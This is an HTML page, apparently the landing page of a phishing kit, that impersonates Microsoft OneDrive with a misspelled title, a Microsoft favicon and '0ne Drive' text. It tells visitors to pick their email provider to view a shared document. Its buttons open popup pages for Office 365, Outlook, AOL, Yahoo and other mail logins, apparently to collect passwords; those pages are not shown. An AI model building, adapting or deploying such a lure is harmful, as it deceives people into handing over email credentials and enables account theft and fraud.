<!DOCTYPE html>
<html>
 <head>
  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
  <meta charset="utf-8"/>
  <title>
   One Drive Cloud Document Sharings.
  </title>
  <link href="https://p.sfx.ms/images/favicon.ico" rel="icon" type="image/x-icon"/>
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:600" rel="stylesheet prefetch"/>
  <link href="style.css" rel="stylesheet"/>
  <script type="text/javascript">
   <!--
function popupwnd(url, toolbar, menubar, locationbar, resize, scrollbars, statusbar, left, top, width, height)
{
   if (left == -1)
   {
      left = (screen.width/2)-(width/2);
   }
   if (top == -1)
   {
      top = (screen.height/2)-(height/2);
   }
   var popupwindow = this.open(url, '', 'toolbar=' + toolbar + ',menubar=' + menubar + ',location=' + locationbar + ',scrollbars=' + scrollbars + ',resizable=' + resize + ',status=' + statusbar + ',left=' + left + ',top=' + top + ',width=' + width + ',height=' + height);
}
//-->
  </script>
 </head>
 <body>
  <div class="login-wrap">
   <div class="login-html">
    <h5 align="center">
     OneDrive
    </h5>
    <div class="foot-lnk">
     <h3>
      To read the document, please choose your email provider below Login to view shared file.
     </h3>
    </div>
    <div class="login-form">
     <div class="sign-in-htm">
      <div class="group">
       <button class="btn-3 loginBtn loginBtn--office" onclick="popupwnd('office.html','no','no','no','no','no','no','300','100','400','400')">
        Login with Office 365
       </button>
      </div>
      <div class="group">
       <button class="btn-3 loginBtn loginBtn--out" onclick="popupwnd('out.html','no','no','no','no','no','no','300','100','480','480')">
        Login with Outlook
       </button>
      </div>
      <div class="group">
       <button class="btn-3 loginBtn loginBtn--ao" onclick="popupwnd('ao.html','no','no','no','no','no','no','300','100','400','400')">
        Login with Aol
       </button>
      </div>
      <div class="group">
       <button class="btn-3 loginBtn loginBtn--ya" onclick="popupwnd('ya.html','no','no','no','no','no','no','300','100','400','400')">
        Login with Yahoo
       </button>
      </div>
      <div class="group">
       <button class="btn-3 loginBtn loginBtn--ot" onclick="popupwnd('ot.html','no','no','no','no','no','no','300','100','400','400')">
        Login with Other Mail
       </button>
      </div>
      <div class="foot-lnk">
       <h4>
        Get to all your files from anywhere on any device , and share them with anyone. 0ne Drive your shared document in one cloud.
       </h4>
      </div>
     </div>
    </div>
   </div>
  </div>
 </body>
</html>
